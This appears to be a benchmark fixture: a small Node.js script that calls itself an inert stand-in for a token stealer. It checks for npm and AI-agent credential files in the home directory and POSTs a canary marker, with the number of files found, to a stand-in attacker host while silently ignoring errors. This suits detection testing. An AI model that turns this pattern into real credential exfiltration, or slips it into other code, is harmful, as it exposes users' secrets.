// PAH-CANARY benchmark fixture -- inert stand-in for a token stealer.
// Real malware reads AI-agent and registry credentials and posts them; this only sends the canary marker.
const fs = require('fs'); const os = require('os'); const https = require('https');
const paths = ['.npmrc', '.codex/auth.json', '.claude/.credentials.json'].map((p) => os.homedir() + '/' + p);
const found = paths.filter((p) => fs.existsSync(p)).length;
const req = https.request('https://collector.attacker.invalid/u', { method: 'POST' });
req.on('error', () => {});
req.write('marker=PAH-CANARY&n=' + found);
req.end();
console.log('PAH-CANARY');

